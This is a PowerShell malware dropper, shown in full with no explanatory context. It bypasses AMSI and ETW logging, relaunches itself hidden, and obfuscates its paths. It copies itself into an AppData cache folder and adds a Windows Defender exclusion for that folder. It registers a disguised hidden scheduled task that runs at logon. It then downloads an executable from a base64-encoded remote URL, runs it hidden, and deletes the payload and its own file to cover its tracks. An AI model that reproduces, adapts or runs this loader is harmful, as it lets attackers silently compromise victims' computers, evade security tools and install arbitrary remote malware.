$ErrorActionPreference='SilentlyContinue'

# AMSI + ETW BYPASS (still alive 2026)
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
try{$etw=[Diagnostics.Eventing.EventProvider];$etw.GetField('m_enabled','NonPublic,Static').SetValue($null,$false)}catch{}

# HIDDEN RELAUNCH
if($Host.Name -eq 'ConsoleHost'){Start-Job -ScriptBlock{param($p)Start-Process powershell -Arg "-ep Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$p`"" -WindowStyle Hidden}-ArgumentList $MyInvocation.MyCommand.Path|Out-Null;exit}

# OBFUSCATED PATHS
$ap=([char]65+[char]112+[char]112+[char]68+[char]97+[char]116+[char]97)
$mic=([char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116)
$win=([char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115)
$cac=([char]67+[char]97+[char]99+[char]104+[char]101+[char]115)
$localPath="$env:$ap\$mic\$win\$cac\$( -join ((65..90)+(97..122)|Get-Random -Count 9|%{[char]$_})).ps1"

# SELF-PRESERVATION
function S{param($d)$dir=Split-Path $d -Parent;if(-not(Test-Path $dir)){New-Item -ItemType Directory -Path $dir -Force|Out-Null}
if($MyInvocation.MyCommand.Path){Copy-Item $MyInvocation.MyCommand.Path $d -Force}else{(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1")|Out-File $d -Encoding UTF8 -Force}
$d}
$scriptPath=S $localPath

# DEFENDER EXCLUSION
try{Add-MpPreference -ExclusionPath "$env:$ap\$mic\$win\$cac" -EA 0}catch{}

# PERSISTENCE (randomized)
$tn=([char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]85+[char]112+[char]100+[char]97+[char]116+[char]101+[char]84+[char]97+[char]115+[char]107)+"_$(Get-Random)"
if(-not(Get-ScheduledTask -TaskName $tn -EA 0)){
$tr=New-ScheduledTaskTrigger -AtLogOn
$enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
$act=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $enc"
$st=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName $tn -Action $act -Trigger $tr -Settings $st -Force|Out-Null}

# DOWNLOAD PAYLOAD IN MEMORY → TEMP (deleted instantly)
$cache="$env:$ap\$mic\$win\$cac"
if(-not(Test-Path $cache)){New-Item -ItemType Directory -Path $cache -Force|Out-Null}
$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
$bytes=$wc.DownloadData($u)
$tmp=[IO.Path]::GetTempFileName()+".exe"
[IO.File]::WriteAllBytes($tmp,$bytes)

# EXECUTE FROM MEMORY (instant delete after launch)
try{Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$tmp`""|Out-Null}catch{}
try{(New-Object -ComObject WScript.Shell).Run("`"$tmp`"",0,$false)}catch{}
try{Start-Process $tmp -WindowStyle Hidden}catch{}

# NUKE FILE IMMEDIATELY
Start-Job -ScriptBlock{param($f)Start-Sleep 3;Remove-Item $f -Force -EA 0}-ArgumentList $tmp|Out-Null

# FINAL SELF-CLEAN JOB
Start-Job -ScriptBlock{param($p)Start-Sleep 300;Remove-Item $p -Force -EA 0}-ArgumentList $scriptPath|Out-Null
